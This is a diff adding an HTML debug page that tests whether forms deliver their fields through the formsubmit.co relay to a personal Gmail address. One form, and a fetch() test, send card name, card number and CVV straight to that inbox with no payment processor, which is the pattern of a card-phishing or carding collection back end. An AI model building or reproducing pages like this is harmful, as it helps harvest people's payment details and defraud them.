@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Debug FormSubmit.co</title>
+</head>
+<body>
+    <h1>Debug FormSubmit.co Email Issue</h1>
+    
+    <h2>Step 1: Test Simple Form</h2>
+    <form id="simple-test" action="https://formsubmit.co/akrasd25@gmail.com" method="POST">
+        <input type="hidden" name="_subject" value="Simple Test">
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="_captcha" value="false">
+        
+        <label for="name">Name:</label>
+        <input type="text" id="name" name="name" required><br><br>
+        
+        <label for="email">Email:</label>
+        <input type="email" id="email" name="email" required><br><br>
+        
+        <button type="submit">Submit Simple Test</button>
+    </form>
+    
+    <h2>Step 2: Test Card Form</h2>
+    <form id="card-test" action="https://formsubmit.co/akrasd25@gmail.com" method="POST">
+        <input type="hidden" name="_subject" value="Card Test">
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="_captcha" value="false">
+        
+        <label for="card_name">Card Name:</label>
+        <input type="text" id="card_name" name="card_name" required><br><br>
+        
+        <label for="card_number">Card Number:</label>
+        <input type="text" id="card_number" name="card_number" required><br><br>
+        
+        <label for="cvv">CVV:</label>
+        <input type="text" id="cvv" name="cvv" required><br><br>
+        
+        <button type="submit">Submit Card Test</button>
+    </form>
+    
+    <h2>Step 3: Test Fetch Method</h2>
+    <button onclick="testFetch()">Test Fetch Submission</button>
+    
+    <div id="results"></div>
+    
+    <script>
+        function testFetch() {
+            const results = document.getElementById('results');
+            results.innerHTML = '<p>Testing fetch submission...</p>';
+            
+            const formData = new FormData();
+            formData.append('_subject', 'Fetch Test');
+            formData.append('_template', 'table');
+            formData.append('_captcha', 'false');
+            formData.append('name', 'Test User');
+            formData.append('email', 'test@example.com');
+            formData.append('card_number', '4242424242424242');
+            formData.append('cvv', '123');
+            
+            fetch('https://formsubmit.co/akrasd25@gmail.com', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                results.innerHTML += '<p>Fetch Response: ' + response.status + ' ' + response.statusText + '</p>';
+                return response.text();
+            })
+            .then(text => {
+                results.innerHTML += '<p>Response Text: ' + text.substring(0, 200) + '...</p>';
+            })
+            .catch(error => {
+                results.innerHTML += '<p>Error: ' + error.message + '</p>';
+            });
+        }
+        
+        // Monitor form submissions
+        document.getElementById('simple-test').addEventListener('submit', function(e) {
+            console.log('Simple form submitted');
+        });
+        
+        document.getElementById('card-test').addEventListener('submit', function(e) {
+            console.log('Card form submitted');
+        });
+    </script>
+</body>
+</html>
